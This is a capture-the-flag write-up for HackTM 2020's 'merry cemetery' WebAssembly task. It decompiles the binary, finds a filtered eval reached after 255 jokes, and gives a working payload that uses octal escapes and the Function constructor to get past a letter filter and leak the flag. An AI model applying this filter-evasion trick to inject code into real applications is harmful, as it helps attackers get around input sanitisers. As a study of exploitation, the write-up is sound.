# merry cemetery - HackTM 2020 Quals  
## Introduction

merry cemetery is a pwn task.

It is a web-assembly task that can be run with `node merry_cemetery.js`.

The goal of this task is to obtain the content of a JavaScript variable,
`aaaa`.  
```  
var aaaa = "HackTM{XXXXXXXXXXXXXXXXXXXXX-real-flag-on-remote-server}";  
```

## Nobody likes web assembly

In order to understand what the web assembly file does, a tool has been used
to  
convert `wasm` to rust. This tool was found from a writeup of 36C3's web  
assembly reverse task.

The main function is exported, which makes it possible to go to the main loop  
quite easily.

The main loop first reads the user's input by calling `func_60`:  
```rust  
var_17 = func_60(); // read  
var_18 = (var_17 << 24 >>s 24) - 36;  
```

If the user's input is a `+`, it reads a joke and increments the local
variable  
at offset 24:  
```rust  
if var_18 == 7 { // +  
   var_2 = load_8s<i32>(var_14 + 24);  
   var_19 = load_8s<i32>(var_14 + 24);  
   var_3 = func_62(var_19);

   if var_3 == 1 {  
       var_20 = load_8s<i32>(var_14 + 24);  
       var_7 = var_20 + 1 << 24 >>s 24;  
       store_8<i32>(var_14 + 24, var_7) // var24++

       var_8 = load_8s<i32>(var_14 + 24);  
       var_9 = load_8s<i32>(var_14 + 24) & 255;  
       if var_9 == 255 {  
           store<i32>(var_14 + 24, -1)  
       }  
   }  
}  
```

If the user's input is `$`, it will first check if the local variable at
offset  
24 is 255. (i.e. if 255 jokes have been submitted)

If it is, it will take a different path than the initial error:  
```rust  
if var_18 == 0 { // $  
   var_23 = load_8s<i32>(var_14 + 24) & 255;  
   if var_23 == 255 { // var24 == 255 ?  
       var_24 = var_14 + 25;  
       func_165(2, var_24, 1);  
       var_25 = load_8s<i32>(var_14 + 25) & 255;  
       func_65(var_25);  
       env._exit(0);  
   }  
   else { // error  
       var_26 = func_57(23724, 15016);  
       var_27 = var_26;  
       var_28 = 331;  
       indirect_call((var_28 & 511) + 0)(var_27);  
       env._exit(0);  
   }  
   return 0;  
}  
```

The program does behave differently after adding 255 jokes. The reward is to
add  
a longer joke to one's epitaph.

The joke is added by `func_65`:  
```rust  
var_3 = func_57(23724, 14848); // do to your kindness...  
var_4 = 331;  
indirect_call((var_4 & 511) + 0)(var_3);

var_5 = func_57(23724, 14970); // ++ Insert joke  
var_6 = 331;  
indirect_call((var_6 & 511) + 0)(var_5);

var_7 = func_166(0, 18144, arg_0); // probably a read  
var_8 = func_64(var_7) != 0; // check joke  
if var_8 {  
   env._emscripten_run_script(18176);  
   global_10 = var_1;  
   return;  
}

var_9 = func_57(23724, 14988); // Sorry quality jokes only  
var_10 = 331;  
indirect_call((var_10 & 511) + 0)(var_9);  
global_10 = var_1;  
return;  
```

This function reads a joke, and calls `func_64` on it. If the function returns  
0, the program will not consider the joke to be a "quality joke" and will
exit.

```rust  
var_13 = 0;  
while true {  
   if var_13 ~~(18144 + var_13); // char[i]  
   var_16 = var_15 << 24 >>s 24 >=s 98;  
   if var_16 {  
       var_1 = var_13;  
       var_2 = 18144 + var_13;  
       var_3 = load_8s<i32>(18144 + var_13);  
       var_17 = load_8s<i32>(18144 + var_13);  
       var_4 = var_17 << 24 >>s 24;  
       var_5 = var_17 << 24 >>s 24 <=s 122; // 'b' <= char[i] <= 'z'  
       if var_5 {  
           var_14 = 7; // bad  
           break;  
       }  
   }~~

   var_18 = load_8s<i32>(18144 + var_13); // char[i]  
   var_19 = var_18 << 24 >>s 24 >=s 65;  
   if var_19 {  
       var_6 = var_13;  
       var_7 = 18144 + var_13;  
       var_8 = load_8s<i32>(18144 + var_13);  
       var_20 = load_8s<i32>(18144 + var_13);  
       var_9 = var_20 << 24 >>s 24;  
       var_10 = var_20 << 24 >>s 24 <=s 90; // 'A' <= char[i] <= 'Z'  
       if var_10 {  
           var_14 = 7; // bad  
           break;  
       }  
   }  
   var_13 += 1;  
}

if var_14 == 7 {  
   global_10 = var_11;  
   return 0;  
}  
if var_14 == 9 {  
   global_10 = var_11;  
   return 1;  
}  
return 0;  
```

This function checks each character of the input. If any of them is in the
range  
`[b-zA-Z]`, it will not be considered a quality joke.

This can be confirmed by sending a joke that only contains `a`. What a quality  
joke:  
```  
exception thrown: ReferenceError:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
is not defined,ReferenceError:
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
is not defined  
   at eval (eval at _emscripten_run_script
(/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:4941:7), <anonymous>:1:1)  
   at _emscripten_run_script (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:4941:7)  
   at _gravestone (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:6420:3)  
   at _main (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:6506:3)  
   at Object.asm._main (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:57690:21)  
   at Object.callMain (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:58006:30)  
   at doRun (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:58064:60)  
   at run (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:58078:5)  
   at Object.<anonymous> (/home/user/ctf/2020/2020-02-01-HackTM/pwn/merry
cemetery/merry_cemetery.js:58201:1)  
   at Module._compile (internal/modules/cjs/loader.js:1151:30)  
```

## character-less eval

The primitive shown above will evaluate JavaScript code that contains no  
character, excepts `a`.

The `jsfuck` obfuscator cannot be used, because the payload is limited in
size.

It is possible to define strings in JavaScript using the octal notation.
(`\141`  
for `a`). Variables that start with `_` and `$` can be used to store  
information.

The idea is to use `Function` to create a new lambda function and call it  
immediately:  
```js  
> Function("console.log(123)")()  
123  
```

`Function` is any function's constructor. It can be accessed with:  
```js  
> ''.constructor.constructor  
[Function: Function]  
> ''.constructor.constructor("console.log(123)")()  
123  
```

The following payload (without comments) was used to throw an exception that  
contains the flag. It contains the tricks presented prior:  
```js  
_=aaaa; // broaden scope of aaaa  
$='\143\157\156\163\164\162\165\143\164\157\162'; // "constructor"  
''[$][$]('\164\150\162\157\167 _')() // "throw _"  
```

```  
Due to your kindness and hard work, the locals would like to reward you by
allowing you to decorate your own gravestone.  
++ Insert Joke:

_=aaaa;  
$='\143\157\156\163\164\162\165\143\164\157\162';  
''[$][$]('\164\150\162\157\167 _')()

exception thrown: HackTM{m4y_y0ur_d4ys_b3_m3rry_4nd_br1ght}  
```

**Flag**: `HackTM{m4y_y0ur_d4ys_b3_m3rry_4nd_br1ght}`

Original writeup
(https://github.com/TFNS/writeups/blob/master/2020-02-01-HackTM/merry%20cemetery/README.md).